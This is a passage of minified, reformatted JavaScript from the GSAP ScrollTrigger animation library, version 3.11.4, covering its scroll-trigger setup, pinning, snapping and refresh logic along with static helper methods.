            (r.prototype.init = function(n, i) {
                if (
                    ((this.progress = this.start = 0), this.vars && this.kill(!0, !0), An)
                ) {
                    var Ne,
                        Ge,
                        Vt,
                        st,
                        ht,
                        _,
                        x,
                        T,
                        P,
                        A,
                        g,
                        N,
                        E,
                        F,
                        k,
                        H,
                        Z,
                        X,
                        q,
                        V,
                        ne,
                        ee,
                        Ae,
                        we,
                        ot,
                        X1,
                        Pt,
                        E1,
                        Ze,
                        Je,
                        de,
                        k1,
                        n1,
                        i1,
                        m1,
                        x1,
                        p3,
                        W3,
                        R1,
                        s = (n = As(l1(n) || Br(n) || n.nodeType ? { trigger: n } : n, En)),
                        o = s.onUpdate,
                        l = s.toggleClass,
                        a = s.id,
                        c = s.onToggle,
                        u = s.onRefresh,
                        h = s.scrub,
                        f = s.trigger,
                        d = s.pin,
                        m = s.pinSpacing,
                        p = s.invalidateOnRefresh,
                        y = s.anticipatePin,
                        v = s.onScrubComplete,
                        S = s.onSnapComplete,
                        w = s.once,
                        C = s.snap,
                        O = s.pinReparent,
                        D = s.pinSpacer,
                        M = s.containerAnimation,
                        I = s.fastScrollEnd,
                        R = s.preventOverlaps,
                        L =
                            n.horizontal || (n.containerAnimation && !1 !== n.horizontal)
                                ? Ct
                                : qe,
                        z = !h && 0 !== h,
                        W = kt(n.scroller || _e),
                        ue = j.core.getCache(W),
                        te = L3(W),
                        J =
                            "fixed" ===
                            ("pinType" in n
                                ? n.pinType
                                : l3(W, "pinType") || (te && "fixed")),
                        U = [n.onEnter, n.onLeave, n.onEnterBack, n.onLeaveBack],
                        Y = z && n.toggleActions.split(" "),
                        $ = "markers" in n ? n.markers : En.markers,
                        fe = te ? 0 : parseFloat(f1(W)["border" + L.p2 + yr]) || 0,
                        b = this,
                        Se =
                            n.onRefreshInit &&
                            function() {
                                return n.onRefreshInit(b);
                            },
                        be = xa(W, te, L),
                        Ot = ya(W, te),
                        Ue = 0,
                        Qe = 0,
                        he = f3(W, L);
                    if (
                        (Mi(b),
                            (b._dir = L),
                            (y *= 45),
                            (b.scroller = W),
                            (b.scroll = M ? M.time.bind(M) : he),
                            (st = he()),
                            (b.vars = n),
                            (i = i || n.animation),
                            "refreshPriority" in n &&
                            ((B4 = 1), -9999 === n.refreshPriority && (Qr = b)),
                            (ue.tweenScroll = ue.tweenScroll || {
                                top: Is(W, qe),
                                left: Is(W, Ct),
                            }),
                            (b.tweenTo = Ne = ue.tweenScroll[L.p]),
                            (b.scrubDuration = function(B) {
                                (k1 = Br(B) && B)
                                    ? de
                                        ? de.duration(B)
                                        : (de = j.to(i, {
                                            ease: "expo",
                                            totalProgress: "+=0.001",
                                            duration: k1,
                                            paused: !0,
                                            onComplete: function() {
                                                return v && v(b);
                                            },
                                        }))
                                    : (de && de.progress(1).kill(), (de = 0));
                            }),
                            i &&
                            ((i.vars.lazy = !1),
                                i._initted ||
                                (!1 !== i.vars.immediateRender &&
                                    !1 !== n.immediateRender &&
                                    i.duration() &&
                                    i.render(0, !0, !0)),
                                (b.animation = i.pause()),
                                (i.scrollTrigger = b),
                                b.scrubDuration(h),
                                (Ze = 0),
                                a || (a = i.vars.id)),
                            se.push(b),
                            C &&
                            ((!Hn(C) || C.push) && (C = { snapTo: C }),
                                "scrollBehavior" in Be.style &&
                                j.set(te ? [Be, c1] : W, { scrollBehavior: "auto" }),
                                ce.forEach(function(B) {
                                    return (
                                        St(B) &&
                                        B.target === (te ? Pe.scrollingElement || c1 : W) &&
                                        (B.smooth = !1)
                                    );
                                }),
                                (Vt = St(C.snapTo)
                                    ? C.snapTo
                                    : "labels" === C.snapTo
                                        ? ba(i)
                                        : "labelsDirectional" === C.snapTo
                                            ? wa(i)
                                            : !1 !== C.directional
                                                ? function(B, Q) {
                                                    return w6(C.snapTo)(B, wt() - Qe < 500 ? 0 : Q.direction);
                                                }
                                                : j.utils.snap(C.snapTo)),
                                (n1 = C.duration || { min: 0.1, max: 2 }),
                                (n1 = Hn(n1) ? er(n1.min, n1.max) : er(n1, n1)),
                                (i1 = j
                                    .delayedCall(C.delay || k1 / 2 || 0.1, function() {
                                        var B = he(),
                                            Q = wt() - Qe < 500,
                                            G = Ne.tween;
                                        if (
                                            !(Q || Math.abs(b.getVelocity()) < 10) ||
                                            G ||
                                            A2 ||
                                            Ue === B
                                        )
                                            b.isActive && Ue !== B && i1.restart(!0);
                                        else {
                                            var re = (B - _) / E,
                                                et = i && !z ? i.totalProgress() : re,
                                                ae = Q ? 0 : ((et - Je) / (wt() - Wn)) * 1e3 || 0,
                                                We = j.utils.clamp(
                                                    -re,
                                                    1 - re,
                                                    (X3(ae / 2) * ae) / 0.185
                                                ),
                                                Re = re + (!1 === C.inertia ? 0 : We),
                                                y1 = er(0, 1, Vt(Re, b)),
                                                Oe = Math.round(_ + y1 * E),
                                                tt = C,
                                                s1 = tt.onStart,
                                                Ie = tt.onInterrupt,
                                                De = tt.onComplete;
                                            if (B <= x && B >= _ && Oe !== B) {
                                                if (G && !G._initted && G.data <= X3(Oe - B)) return;
                                                !1 === C.inertia && (We = y1 - re),
                                                    Ne(
                                                        Oe,
                                                        {
                                                            duration: n1(
                                                                X3(
                                                                    (0.185 * Math.max(X3(Re - et), X3(y1 - et))) /
                                                                    ae /
                                                                    0.05 || 0
                                                                )
                                                            ),
                                                            ease: C.ease || "power3",
                                                            data: X3(Oe - B),
                                                            onInterrupt: function() {
                                                                return i1.restart(!0) && Ie && Ie(b);
                                                            },
                                                            onComplete: function() {
                                                                b.update(),
                                                                    (Ue = he()),
                                                                    (Ze = Je =
                                                                        i && !z ? i.totalProgress() : b.progress),
                                                                    S && S(b),
                                                                    De && De(b);
                                                            },
                                                        },
                                                        B,
                                                        We * E,
                                                        Oe - B - We * E
                                                    ),
                                                    s1 && s1(b, Ne.tween);
                                            }
                                        }
                                    })
                                    .pause())),
                            a && (ki[a] = b),
                            (R1 =
                                (f = b.trigger = kt(f || d)) && f._gsap && f._gsap.stRevert) &&
                            (R1 = R1(b)),
                            (d = !0 === d ? f : kt(d)),
                            l1(l) && (l = { targets: f, className: l }),
                            d &&
                            (!1 === m ||
                                m === qt ||
                                (m =
                                    !(
                                        !m &&
                                        d.parentNode &&
                                        d.parentNode.style &&
                                        "flex" === f1(d.parentNode).display
                                    ) && $e),
                                (b.pin = d),
                                (Ge = j.core.getCache(d)).spacer
                                    ? (F = Ge.pinState)
                                    : (D &&
                                        ((D = kt(D)) &&
                                            !D.nodeType &&
                                            (D = D.current || D.nativeElement),
                                            (Ge.spacerIsNative = !!D),
                                            D && (Ge.spacerState = Rn(D))),
                                        (Ge.spacer = Z = D || Pe.createElement("div")),
                                        Z.classList.add("pin-spacer"),
                                        a && Z.classList.add("pin-spacer-" + a),
                                        (Ge.pinState = F = Rn(d))),
                                !1 !== n.force3D && j.set(d, { force3D: !0 }),
                                (b.spacer = Z = Ge.spacer),
                                (E1 = f1(d)),
                                (Ae = E1[m + L.os2]),
                                (q = j.getProperty(d)),
                                (V = j.quickSetter(d, L.a, lt)),
                                j2(d, Z, E1),
                                (H = Rn(d))),
                            $)
                    ) {
                        (N = Hn($) ? As($, Os) : Os),
                            (A = kn("scroller-start", a, W, L, N, 0)),
                            (g = kn("scroller-end", a, W, L, N, 0, A)),
                            (X = A["offset" + L.op.d2]);
                        var Sr = kt(l3(W, "content") || W);
                        (T = this.markerStart = kn("start", a, Sr, L, N, X, 0, M)),
                            (P = this.markerEnd = kn("end", a, Sr, L, N, X, 0, M)),
                            M && (W3 = j.quickSetter([T, P], L.a, lt)),
                            !J &&
                            (!O1.length || !0 !== l3(W, "fixedMarkers")) &&
                            (va(te ? Be : W),
                                j.set([A, g], { force3D: !0 }),
                                (ot = j.quickSetter(A, L.a, lt)),
                                (Pt = j.quickSetter(g, L.a, lt)));
                    }
                    if (M) {
                        var ge = M.vars.onUpdate,
                            K = M.vars.onUpdateParams;
                        M.eventCallback("onUpdate", function() {
                            b.update(0, 0, 1), ge && ge.apply(K || []);
                        });
                    }
                    (b.previous = function() {
                        return se[se.indexOf(b) - 1];
                    }),
                        (b.next = function() {
                            return se[se.indexOf(b) + 1];
                        }),
                        (b.revert = function(B, Q) {
                            if (!Q) return b.kill(!0);
                            var G = !1 !== B || !b.enabled,
                                re = dt;
                            G !== b.isReverted &&
                                (G &&
                                    ((x1 = Math.max(he(), b.scroll.rec || 0)),
                                        (m1 = b.progress),
                                        (p3 = i && i.progress())),
                                    T &&
                                    [T, P, A, g].forEach(function(et) {
                                        return (et.style.display = G ? "none" : "block");
                                    }),
                                    G && ((dt = 1), b.update(G)),
                                    d &&
                                    (!O || !b.isActive) &&
                                    (G ? Sa(d, Z, F) : j2(d, Z, f1(d), we)),
                                    G || b.update(G),
                                    (dt = re),
                                    (b.isReverted = G));
                        }),
                        (b.refresh = function(B, Q) {
                            if ((!dt && b.enabled) || Q) {
                                if (d && B && t1) return void at(r, "scrollEnd", V4);
                                !a1 && Se && Se(b),
                                    (dt = 1),
                                    (Qe = wt()),
                                    Ne.tween && (Ne.tween.kill(), (Ne.tween = 0)),
                                    de && de.pause(),
                                    p && i && i.revert({ kill: !1 }).invalidate(),
                                    b.isReverted || b.revert(!0, !0),
                                    (b._subPinOffset = !1);
                                for (
                                    var De,
                                    He,
                                    H3,
                                    g3,
                                    je,
                                    Fe,
                                    I1,
                                    O2,
                                    S6,
                                    Ar,
                                    v1,
                                    G = be(),
                                    re = Ot(),
                                    et = M ? M.duration() : r3(W, L),
                                    ae = 0,
                                    We = 0,
                                    Re = n.end,
                                    y1 = n.endTrigger || f,
                                    Oe =
                                        n.start ||
                                        (0 !== n.start && f ? (d ? "0 0" : "0 100%") : 0),
                                    tt = (b.pinnedContainer =
                                        n.pinnedContainer && kt(n.pinnedContainer)),
                                    s1 = (f && Math.max(0, se.indexOf(b))) || 0,
                                    Ie = s1;
                                    Ie--;

                                )
                                    (Fe = se[Ie]).end || Fe.refresh(0, 1) || (dt = 1),
                                        (I1 = Fe.pin) &&
                                        (I1 === f || I1 === d) &&
                                        !Fe.isReverted &&
                                        (Ar || (Ar = []), Ar.unshift(Fe), Fe.revert(!0, !0)),
                                        Fe !== se[Ie] && (s1--, Ie--);
                                for (
                                    St(Oe) && (Oe = Oe(b)),
                                    _ =
                                    ks(Oe, f, G, L, he(), T, A, b, re, fe, J, et, M) ||
                                    (d ? -0.001 : 0),
                                    St(Re) && (Re = Re(b)),
                                    l1(Re) &&
                                    !Re.indexOf("+=") &&
                                    (~Re.indexOf(" ")
                                        ? (Re = (l1(Oe) ? Oe.split(" ")[0] : "") + Re)
                                        : ((ae = Yn(Re.substr(2), G)),
                                            (Re = l1(Oe) ? Oe : _ + ae),
                                            (y1 = f))),
                                    x =
                                    Math.max(
                                        _,
                                        ks(
                                            Re || (y1 ? "100% 0" : et),
                                            y1,
                                            G,
                                            L,
                                            he() + ae,
                                            P,
                                            g,
                                            b,
                                            re,
                                            fe,
                                            J,
                                            et,
                                            M
                                        )
                                    ) || -0.001,
                                    E = x - _ || ((_ -= 0.01) && 0.001),
                                    ae = 0,
                                    Ie = s1;
                                    Ie--;

                                )
                                    (I1 = (Fe = se[Ie]).pin) &&
                                        Fe.start - Fe._pinPush <= _ &&
                                        !M &&
                                        Fe.end > 0 &&
                                        ((De = Fe.end - Fe.start),
                                            ((I1 === f && Fe.start - Fe._pinPush < _) || I1 === tt) &&
                                            !Br(Oe) &&
                                            (ae += De * (1 - Fe.progress)),
                                            I1 === d && (We += De));
                                if (
                                    ((_ += ae),
                                        (x += ae),
                                        (b._pinPush = We),
                                        T &&
                                        ae &&
                                        (((De = {})[L.a] = "+=" + ae),
                                            tt && (De[L.p] = "-=" + he()),
                                            j.set([T, P], De)),
                                        d)
                                )
                                    (De = f1(d)),
                                        (g3 = L === qe),
                                        (H3 = he()),
                                        (ne = parseFloat(q(L.a)) + We),
                                        !et &&
                                        x > 1 &&
                                        ((v1 = {
                                            style: (v1 = (te ? Pe.scrollingElement || c1 : W)
                                                .style),
                                            value: v1["overflow" + L.a.toUpperCase()],
                                        })["overflow" + L.a.toUpperCase()] = "scroll"),
                                        j2(d, Z, De),
                                        (H = Rn(d)),
                                        (He = N1(d, !0)),
                                        (O2 = J && f3(W, g3 ? Ct : qe)()),
                                        m &&
                                        (((we = [m + L.os2, E + We + lt]).t = Z),
                                            (Ie = m === $e ? Ei(d, L) + E + We : 0) &&
                                            we.push(L.d, Ie + lt),
                                            ar(we),
                                            tt &&
                                            se.forEach(function(Or) {
                                                Or.pin === tt &&
                                                    !1 !== Or.vars.pinSpacing &&
                                                    (Or._subPinOffset = !0);
                                            }),
                                            J && he(x1)),
                                        J &&
                                        (((je = {
                                            top: He.top + (g3 ? H3 - _ : O2) + lt,
                                            left: He.left + (g3 ? O2 : H3 - _) + lt,
                                            boxSizing: "border-box",
                                            position: "fixed",
                                        })[I3] = je["max" + yr] =
                                            Math.ceil(He.width) + lt),
                                            (je[D3] = je["max" + b6] = Math.ceil(He.height) + lt),
                                            (je[qt] =
                                                je[qt + Kr] =
                                                je[qt + Vr] =
                                                je[qt + qr] =
                                                je[qt + jr] =
                                                "0"),
                                            (je[$e] = De[$e]),
                                            (je[$e + Kr] = De[$e + Kr]),
                                            (je[$e + Vr] = De[$e + Vr]),
                                            (je[$e + qr] = De[$e + qr]),
                                            (je[$e + jr] = De[$e + jr]),
                                            (k = Oa(F, je, O)),
                                            a1 && he(0)),
                                        i
                                            ? ((S6 = i._initted),
                                                W2(1),
                                                i.render(i.duration(), !0, !0),
                                                (ee = q(L.a) - ne + E + We),
                                                (X1 = Math.abs(E - ee) > 1),
                                                J && X1 && k.splice(k.length - 2, 2),
                                                i.render(0, !0, !0),
                                                S6 || i.invalidate(!0),
                                                i.parent || i.totalTime(i.totalTime()),
                                                W2(0))
                                            : (ee = E),
                                        v1 &&
                                        (v1.value
                                            ? (v1.style["overflow" + L.a.toUpperCase()] = v1.value)
                                            : v1.style.removeProperty("overflow-" + L.a));
                                else if (f && he() && !M)
                                    for (He = f.parentNode; He && He !== Be;)
                                        He._pinOffset &&
                                            ((_ -= He._pinOffset), (x -= He._pinOffset)),
                                            (He = He.parentNode);
                                Ar &&
                                    Ar.forEach(function(Or) {
                                        return Or.revert(!1, !0);
                                    }),
                                    (b.start = _),
                                    (b.end = x),
                                    (st = ht = a1 ? x1 : he()),
                                    !M && !a1 && (st < x1 && he(x1), (b.scroll.rec = 0)),
                                    b.revert(!1, !0),
                                    i1 &&
                                    ((Ue = -1), b.isActive && he(_ + E * m1), i1.restart(!0)),
                                    (dt = 0),
                                    i &&
                                    z &&
                                    (i._initted || p3) &&
                                    i.progress() !== p3 &&
                                    i.progress(p3, !0).render(i.time(), !0, !0),
                                    (m1 !== b.progress || M) &&
                                    (i && !z && i.totalProgress(m1, !0),
                                        (b.progress = (st - _) / E === m1 ? 0 : m1)),
                                    d && m && (Z._pinOffset = Math.round(b.progress * ee)),
                                    u && !a1 && u(b);
                            }
                        }),
                        (b.getVelocity = function() {
                            return ((he() - ht) / (wt() - Wn)) * 1e3 || 0;
                        }),
                        (b.endAnimation = function() {
                            kr(b.callbackAnimation),
                                i &&
                                (de
                                    ? de.progress(1)
                                    : i.paused()
                                        ? z || kr(i, b.direction < 0, 1)
                                        : kr(i, i.reversed()));
                        }),
                        (b.labelToScroll = function(B) {
                            return (
                                (i &&
                                    i.labels &&
                                    (_ || b.refresh() || _) + (i.labels[B] / i.duration()) * E) ||
                                0
                            );
                        }),
                        (b.getTrailing = function(B) {
                            var Q = se.indexOf(b),
                                G =
                                    b.direction > 0 ? se.slice(0, Q).reverse() : se.slice(Q + 1);
                            return (
                                l1(B)
                                    ? G.filter(function(re) {
                                        return re.vars.preventOverlaps === B;
                                    })
                                    : G
                            ).filter(function(re) {
                                return b.direction > 0 ? re.end <= _ : re.start >= x;
                            });
                        }),
                        (b.update = function(B, Q, G) {
                            if (!M || G || B) {
                                var Re,
                                    Oe,
                                    tt,
                                    s1,
                                    Ie,
                                    De,
                                    He,
                                    re = a1 ? x1 : b.scroll(),
                                    et = B ? 0 : (re - _) / E,
                                    ae = et < 0 ? 0 : et > 1 ? 1 : et || 0,
                                    We = b.progress;
                                if (
                                    (Q &&
                                        ((ht = st),
                                            (st = M ? he() : re),
                                            C && ((Je = Ze), (Ze = i && !z ? i.totalProgress() : ae))),
                                        y &&
                                        !ae &&
                                        d &&
                                        !dt &&
                                        !Sn &&
                                        t1 &&
                                        _ < re + ((re - ht) / (wt() - Wn)) * y &&
                                        (ae = 1e-4),
                                        ae !== We && b.enabled)
                                ) {
                                    if (
                                        ((s1 =
                                            (Ie =
                                                (Re = b.isActive = !!ae && ae < 1) !==
                                                (!!We && We < 1)) || !!ae != !!We),
                                            (b.direction = ae > We ? 1 : -1),
                                            (b.progress = ae),
                                            s1 &&
                                            !dt &&
                                            ((Oe = ae && !We ? 0 : 1 === ae ? 1 : 1 === We ? 2 : 3),
                                                z &&
                                                ((tt =
                                                    (!Ie && "none" !== Y[Oe + 1] && Y[Oe + 1]) || Y[Oe]),
                                                    (He =
                                                        i &&
                                                        ("complete" === tt || "reset" === tt || tt in i)))),
                                            R &&
                                            (Ie || He) &&
                                            (He || h || !i) &&
                                            (St(R)
                                                ? R(b)
                                                : b.getTrailing(R).forEach(function(Fe) {
                                                    return Fe.endAnimation();
                                                })),
                                            z ||
                                            (!de || dt || Sn
                                                ? i && i.totalProgress(ae, !!dt)
                                                : (de._dp._time - de._start !== de._time &&
                                                    de.render(de._dp._time - de._start),
                                                    de.resetTo
                                                        ? de.resetTo(
                                                            "totalProgress",
                                                            ae,
                                                            i._tTime / i._tDur
                                                        )
                                                        : ((de.vars.totalProgress = ae),
                                                            de.invalidate().restart()))),
                                            d)
                                    )
                                        if ((B && m && (Z.style[m + L.os2] = Ae), J)) {
                                            if (s1) {
                                                if (
                                                    ((De =
                                                        !B && ae > We && x + 1 > re && re + 1 >= r3(W, L)),
                                                        O)
                                                )
                                                    if (B || (!Re && !De)) Rs(d, Z);
                                                    else {
                                                        var H3 = N1(d, !0),
                                                            g3 = re - _;
                                                        Rs(
                                                            d,
                                                            Be,
                                                            H3.top + (L === qe ? g3 : 0) + lt,
                                                            H3.left + (L === qe ? 0 : g3) + lt
                                                        );
                                                    }
                                                ar(Re || De ? k : H),
                                                    (X1 && ae < 1 && Re) ||
                                                    V(ne + (1 !== ae || De ? 0 : ee));
                                            }
                                        } else V(Fr(ne + ee * ae));
                                    C && !Ne.tween && !dt && !Sn && i1.restart(!0),
                                        l &&
                                        (Ie || (w && ae && (ae < 1 || !H2))) &&
                                        u2(l.targets).forEach(function(Fe) {
                                            return Fe.classList[Re || w ? "add" : "remove"](
                                                l.className
                                            );
                                        }),
                                        o && !z && !B && o(b),
                                        s1 && !dt
                                            ? (z &&
                                                (He &&
                                                    ("complete" === tt
                                                        ? i.pause().totalProgress(1)
                                                        : "reset" === tt
                                                            ? i.restart(!0).pause()
                                                            : "restart" === tt
                                                                ? i.restart(!0)
                                                                : i[tt]()),
                                                    o && o(b)),
                                                (Ie || !H2) &&
                                                (c && Ie && X2(b, c),
                                                    U[Oe] && X2(b, U[Oe]),
                                                    w && (1 === ae ? b.kill(!1, 1) : (U[Oe] = 0)),
                                                    Ie || (U[(Oe = 1 === ae ? 1 : 3)] && X2(b, U[Oe]))),
                                                I &&
                                                !Re &&
                                                Math.abs(b.getVelocity()) > (Br(I) ? I : 2500) &&
                                                (kr(b.callbackAnimation),
                                                    de
                                                        ? de.progress(1)
                                                        : kr(i, "reverse" === tt ? 1 : !ae, 1)))
                                            : z && o && !dt && o(b);
                                }
                                if (Pt) {
                                    var je = M
                                        ? (re / M.duration()) * (M._caScrollDist || 0)
                                        : re;
                                    ot(je + (A._isFlipped ? 1 : 0)), Pt(je);
                                }
                                W3 && W3((-re / M.duration()) * (M._caScrollDist || 0));
                            }
                        }),
                        (b.enable = function(B, Q) {
                            b.enabled ||
                                ((b.enabled = !0),
                                    at(W, "resize", Lr),
                                    at(te ? Pe : W, "scroll", V3),
                                    Se && at(r, "refreshInit", Se),
                                    !1 !== B && ((b.progress = m1 = 0), (st = ht = Ue = he())),
                                    !1 !== Q && b.refresh());
                        }),
                        (b.getTween = function(B) {
                            return B && Ne ? Ne.tween : de;
                        }),
                        (b.setPositions = function(B, Q) {
                            d &&
                                ((ne += B - _),
                                    (ee += Q - B - E),
                                    m === $e && b.adjustPinSpacing(Q - B - E)),
                                (b.start = _ = B),
                                (b.end = x = Q),
                                (E = Q - B),
                                b.update();
                        }),
                        (b.adjustPinSpacing = function(B) {
                            if (we) {
                                var Q = we.indexOf(L.d) + 1;
                                (we[Q] = parseFloat(we[Q]) + B + lt),
                                    (we[1] = parseFloat(we[1]) + B + lt),
                                    ar(we);
                            }
                        }),
                        (b.disable = function(B, Q) {
                            if (
                                b.enabled &&
                                (!1 !== B && b.revert(!0, !0),
                                    (b.enabled = b.isActive = !1),
                                    Q || (de && de.pause()),
                                    (x1 = 0),
                                    Ge && (Ge.uncache = 1),
                                    Se && rt(r, "refreshInit", Se),
                                    i1 &&
                                    (i1.pause(), Ne.tween && Ne.tween.kill() && (Ne.tween = 0)),
                                    !te)
                            ) {
                                for (var G = se.length; G--;)
                                    if (se[G].scroller === W && se[G] !== b) return;
                                rt(W, "resize", Lr), rt(W, "scroll", V3);
                            }
                        }),
                        (b.kill = function(B, Q) {
                            b.disable(B, Q), de && !Q && de.kill(), a && delete ki[a];
                            var G = se.indexOf(b);
                            G >= 0 && se.splice(G, 1),
                                G === bt && Vn > 0 && bt--,
                                (G = 0),
                                se.forEach(function(re) {
                                    return re.scroller === b.scroller && (G = 1);
                                }),
                                G || a1 || (b.scroll.rec = 0),
                                i &&
                                ((i.scrollTrigger = null),
                                    B && i.revert({ kill: !1 }),
                                    Q || i.kill()),
                                T &&
                                [T, P, A, g].forEach(function(re) {
                                    return re.parentNode && re.parentNode.removeChild(re);
                                }),
                                Qr === b && (Qr = 0),
                                d &&
                                (Ge && (Ge.uncache = 1),
                                    (G = 0),
                                    se.forEach(function(re) {
                                        return re.pin === d && G++;
                                    }),
                                    G || (Ge.spacer = 0)),
                                n.onKill && n.onKill(b);
                        }),
                        b.enable(!1, !1),
                        R1 && R1(b),
                        i && i.add && !E
                            ? j.delayedCall(0.01, function() {
                                return _ || x || b.refresh();
                            }) &&
                            (E = 0.01) &&
                            (_ = x = 0)
                            : b.refresh(),
                        d && Ca();
                } else this.update = this.refresh = this.kill = w1;
            }),
            (r.register = function(n) {
                return (
                    j3 ||
                    ((j = n || U4()), z4() && window.document && r.enable(), (j3 = An)),
                    j3
                );
            }),
            (r.defaults = function(n) {
                if (n) for (var i in n) En[i] = n[i];
                return En;
            }),
            (r.disable = function(n, i) {
                (An = 0),
                    se.forEach(function(o) {
                        return o[i ? "kill" : "disable"](n);
                    }),
                    rt(_e, "wheel", V3),
                    rt(Pe, "scroll", V3),
                    clearInterval(Cn),
                    rt(Pe, "touchcancel", w1),
                    rt(Be, "touchstart", w1),
                    Pn(rt, Pe, "pointerdown,touchstart,mousedown", Cs),
                    Pn(rt, Pe, "pointerup,touchend,mouseup", Ss),
                    c2.kill(),
                    On(rt);
                for (var s = 0; s < ce.length; s += 3)
                    Mn(rt, ce[s], ce[s + 1]), Mn(rt, ce[s], ce[s + 2]);
            }),
            (r.enable = function() {
                if (
                    ((_e = window),
                        (Pe = document),
                        (c1 = Pe.documentElement),
                        (Be = Pe.body),
                        j &&
                        ((u2 = j.utils.toArray),
                            (er = j.utils.clamp),
                            (Mi = j.core.context || w1),
                            (W2 = j.core.suppressOverwrites || w1),
                            (x6 = _e.history.scrollRestoration || "auto"),
                            j.core.globals("ScrollTrigger", r),
                            Be))
                ) {
                    (An = 1),
                        Xe.register(j),
                        (r.isTouch = Xe.isTouch),
                        (j1 =
                            Xe.isTouch &&
                            /(iPad|iPhone|iPod|Mac)/g.test(navigator.userAgent)),
                        at(_e, "wheel", V3),
                        (F4 = [_e, Pe, c1, Be]),
                        j.matchMedia
                            ? ((r.matchMedia = function(a) {
                                var u,
                                    c = j.matchMedia();
                                for (u in a) c.add(u, a[u]);
                                return c;
                            }),
                                j.addEventListener("matchMediaInit", function() {
                                    return T6();
                                }),
                                j.addEventListener("matchMediaRevert", function() {
                                    return j4();
                                }),
                                j.addEventListener("matchMedia", function() {
                                    O3(0, 1), Z3("matchMedia");
                                }),
                                j.matchMedia("(orientation: portrait)", function() {
                                    return V2(), V2;
                                }))
                            : console.warn("Requires GSAP 3.11.0 or later"),
                        V2(),
                        at(Pe, "scroll", V3);
                    var o,
                        l,
                        n = Be.style,
                        i = n.borderTopStyle,
                        s = j.core.Animation.prototype;
                    for (
                        s.revert ||
                        Object.defineProperty(s, "revert", {
                            value: function() {
                                return this.time(-0.01, !0);
                            },
                        }),
                        n.borderTopStyle = "solid",
                        o = N1(Be),
                        qe.m = Math.round(o.top + qe.sc()) || 0,
                        Ct.m = Math.round(o.left + Ct.sc()) || 0,
                        i ? (n.borderTopStyle = i) : n.removeProperty("border-top-style"),
                        Cn = setInterval(Ps, 250),
                        j.delayedCall(0.5, function() {
                            return (Sn = 0);
                        }),
                        at(Pe, "touchcancel", w1),
                        at(Be, "touchstart", w1),
                        Pn(at, Pe, "pointerdown,touchstart,mousedown", Cs),
                        Pn(at, Pe, "pointerup,touchend,mouseup", Ss),
                        Pi = j.utils.checkPrefix("transform"),
                        jn.push(Pi),
                        j3 = wt(),
                        c2 = j.delayedCall(0.2, O3).pause(),
                        K3 = [
                            Pe,
                            "visibilitychange",
                            function() {
                                var a = _e.innerWidth,
                                    c = _e.innerHeight;
                                Pe.hidden
                                    ? ((ws = a), (Ts = c))
                                    : (ws !== a || Ts !== c) && Lr();
                            },
                            Pe,
                            "DOMContentLoaded",
                            O3,
                            _e,
                            "load",
                            O3,
                            _e,
                            "resize",
                            Lr,
                        ],
                        On(at),
                        se.forEach(function(a) {
                            return a.enable(0, 1);
                        }),
                        l = 0;
                        l < ce.length;
                        l += 3
                    )
                        Mn(rt, ce[l], ce[l + 1]), Mn(rt, ce[l], ce[l + 2]);
                }
            }),
            (r.config = function(n) {
                "limitCallbacks" in n && (H2 = !!n.limitCallbacks);
                var i = n.syncInterval;
                (i && clearInterval(Cn)) || ((Cn = i) && setInterval(Ps, i)),
                    "ignoreMobileResize" in n &&
                    (N4 = 1 === r.isTouch && n.ignoreMobileResize),
                    "autoRefreshEvents" in n &&
                    (On(rt) || On(at, n.autoRefreshEvents || "none"),
                        (L4 = -1 === (n.autoRefreshEvents + "").indexOf("resize")));
            }),
            (r.scrollerProxy = function(n, i) {
                var s = kt(n),
                    o = ce.indexOf(s),
                    l = L3(s);
                ~o && ce.splice(o, l ? 6 : 2),
                    i && (l ? O1.unshift(_e, i, Be, i, c1, i) : O1.unshift(s, i));
            }),
            (r.clearMatchMedia = function(n) {
                se.forEach(function(i) {
                    return i._ctx && i._ctx.query === n && i._ctx.kill(!0, !0);
                });
            }),
            (r.isInViewport = function(n, i, s) {
                var o = (l1(n) ? kt(n) : n).getBoundingClientRect(),
                    l = o[s ? I3 : D3] * i || 0;
                return s
                    ? o.right - l > 0 && o.left + l < _e.innerWidth
                    : o.bottom - l > 0 && o.top + l < _e.innerHeight;
            }),
            (r.positionInViewport = function(n, i, s) {
                l1(n) && (n = kt(n));
                var o = n.getBoundingClientRect(),
                    l = o[s ? I3 : D3],
                    a =
                        null == i
                            ? l / 2
                            : i in f2
                                ? f2[i] * l
                                : ~i.indexOf("%")
                                    ? (parseFloat(i) * l) / 100
                                    : parseFloat(i) || 0;
                return s ? (o.left + a) / _e.innerWidth : (o.top + a) / _e.innerHeight;
            }),
            (r.killAll = function(n) {
                if (
                    (se.slice(0).forEach(function(s) {
                        return "ScrollSmoother" !== s.vars.id && s.kill();
                    }),
                        !0 !== n)
                ) {
                    var i = N3.killAll || [];
                    (N3 = {}),
                        i.forEach(function(s) {
                            return s();
                        });
                }
            }),
            r
        );
    })();
(le.version = "3.11.4"),
    (le.saveStyles = function(r) {
        return r
            ? u2(r).forEach(function(e) {
                if (e && e.style) {
                    var t = Nt.indexOf(e);
                    t >= 0 && Nt.splice(t, 5),
                        Nt.push(
                            e,
                            e.style.cssText,
                            e.getBBox && e.getAttribute("transform"),
                            j.core.getCache(e),
                            Mi()
                        );
                }
            })
            : Nt;
    }),
    (le.revert = function(r, e) {
        return T6(!r, e);
    }),
    (le.create = function(r, e) {
        return new le(r, e);
    }),
    (le.refresh = function(r) {
        return r ? Lr() : (j3 || le.register()) && O3(!0);
    }),
    (le.update = function(r) {
        return ++ce.cache && h3(!0 === r ? 2 : 0);
    }),
    (le.clearScrollMemory = K4),
    (le.maxScroll = function(r, e) {
        return r3(r, e ? Ct : qe);
    }),
    (le.getScrollFunc = function(r, e) {
        return f3(kt(r), e ? Ct : qe);
    }),
    (le.getById = function(r) {
        return ki[r];
    }),
    (le.getAll = function() {
        return se.filter(function(r) {
            return "ScrollSmoother" !== r.vars.id;
        });
    }),
    (le.isScrolling = function() {
        return !!t1;
    }),
    (le.snapDirectional = w6),
    (le.addEventListener = function(r, e) {
        var t = N3[r] || (N3[r] = []);
        ~t.indexOf(e) || t.push(e);
    }),
    (le.removeEventListener = function(r, e) {
        var t = N3[r],
            n = t && t.indexOf(e);
        n >= 0 && t.splice(n, 1);
    }),
    (le.batch = function(r, e) {
        var l,
            t = [],
            n = {},
            i = e.interval || 0.016,
            s = e.batchMax || 1e9,
            o = function(c, u) {
                var h = [],
                    f = [],
                    d = j
                        .delayedCall(i, function() {
                            u(h, f), (h = []), (f = []);
                        })
                        .pause();
                return function(m) {
                    h.length || d.restart(!0),
                        h.push(m.trigger),
                        f.push(m),
                        s <= h.length && d.progress(1);
